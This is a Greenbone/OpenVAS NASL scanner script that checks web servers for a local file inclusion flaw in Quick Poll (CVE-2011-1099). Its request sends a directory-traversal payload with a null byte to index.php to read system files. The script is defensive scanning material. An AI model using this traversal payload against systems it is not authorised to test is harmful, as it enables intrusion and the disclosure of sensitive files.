if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103110" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-08 14:02:18 +0100 (Tue, 08 Mar 2011)" );
	script_bugtraq_id( 46770 );
	script_tag( name: "cvss_base", value: "5.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:P" );
	script_cve_id( "CVE-2011-1099" );
	script_name( "Quick Poll Local File Include and Arbitrary File Deletion Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46770" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516873" );
	script_xref( name: "URL", value: "http://www.uncompiled.com/2011/03/quick-polls-local-file-inclusion-deletion-vulnerabilities-cve-2011-1099/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor patch is available. Please see the reference for details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Quick Poll is prone to a local file-include vulnerability and an arbitrary-file-
  deletion vulnerability because the application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit a local file-include vulnerability to obtain
  potentially sensitive information and execute arbitrary local scripts in the context of the webserver
  process. This may allow the attacker to compromise the application and the computer. Other attacks are
  also possible.

  Attackers can exploit arbitrary-file deletion vulnerability with directory-
  traversal strings ('../') to delete arbitrary files. This may aid in
  launching further attacks." );
	script_tag( name: "affected", value: "Versions prior to Quick Poll 1.0.2 are vulnerable." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/quickpoll", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	for file in keys( files ) {
		url = NASLString( dir, "/index.php?fct=preview&p=", crap( data: "../", length: 6 * 9 ), files[file], "%00" );
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

